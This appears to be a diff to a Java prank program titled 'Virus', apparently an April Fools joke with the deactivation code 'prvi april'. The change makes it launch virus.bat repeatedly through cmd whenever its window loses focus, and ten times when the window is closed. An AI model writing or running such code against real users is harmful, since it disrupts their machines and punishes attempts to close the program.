@@ -13,6 +13,7 @@ public class Virus {
     private String[] instructions;
     private int instructionIndex;
     private boolean isActivated;
+    private Timer timer;
 
     public Virus() {
         this.Text.setText("This is a virus.\n" +
@@ -65,6 +66,8 @@ public class Virus {
         this.OK.setVisible(false);
         this.deactivationCode.setVisible(false);
         this.isActivated = true;
+        this.timer = new Timer(1000, e -> this.virus(1));
+        this.timer.setInitialDelay(500);
 
         this.OK.addActionListener(e -> {
             if (this.deactivationCode.getText().equals("prvi april")) {
@@ -89,27 +92,29 @@ public class Virus {
             @Override
             public void windowGainedFocus(WindowEvent e) {
                 System.out.println("gained focus");
+                virus.timer.stop();
             }
 
             @Override
             public void windowLostFocus(WindowEvent e) {
-                virus.virus();
+                System.out.println("lost focus");
+                virus.timer.start();
             }
         });
 
         frame.addWindowListener(new WindowAdapter() {
             @Override
             public void windowClosing(WindowEvent e) {
-                virus.virus();
+                virus.virus(10);
             }
         });
     }
 
-    public void virus() {
+    public void virus(int a) {
         System.out.println("Virus activated");
         try {
             if (this.isActivated) {
-                for (int i = 0; i < 6; i++) {
+                for (int i = 0; i < a; i++) {
                     Runtime.getRuntime().exec("cmd /c start \"\" virus.bat");
                 }
             }
